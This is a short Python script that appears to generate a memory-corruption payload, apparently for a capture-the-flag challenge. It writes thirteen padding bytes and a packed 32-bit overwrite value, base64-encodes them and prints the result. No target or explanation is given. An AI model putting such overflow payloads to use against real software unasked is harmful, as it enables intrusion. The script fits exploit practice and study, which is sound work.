
import sys
import struct
import base64

buf = b'sssssssssssss'
buf += struct.pack('<I', 1858387175)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
